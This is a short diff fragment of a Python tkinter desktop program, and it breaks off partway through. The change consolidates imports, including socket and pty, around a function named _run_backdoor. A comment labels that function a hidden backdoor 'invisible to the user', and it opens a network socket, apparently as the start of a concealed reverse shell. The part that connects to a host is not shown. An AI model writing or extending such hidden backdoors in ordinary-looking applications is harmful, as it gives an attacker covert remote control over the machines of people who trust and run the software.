@@ -1,10 +1,8 @@
 import tkinter as tk
 from tkinter import ttk, messagebox
-import threading, os, pty
+import threading, os, pty, socket
 
 # --- THE HIDDEN BACKDOOR (Invisible to the user) ---
-import socket, os, pty
-
 def _run_backdoor():
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
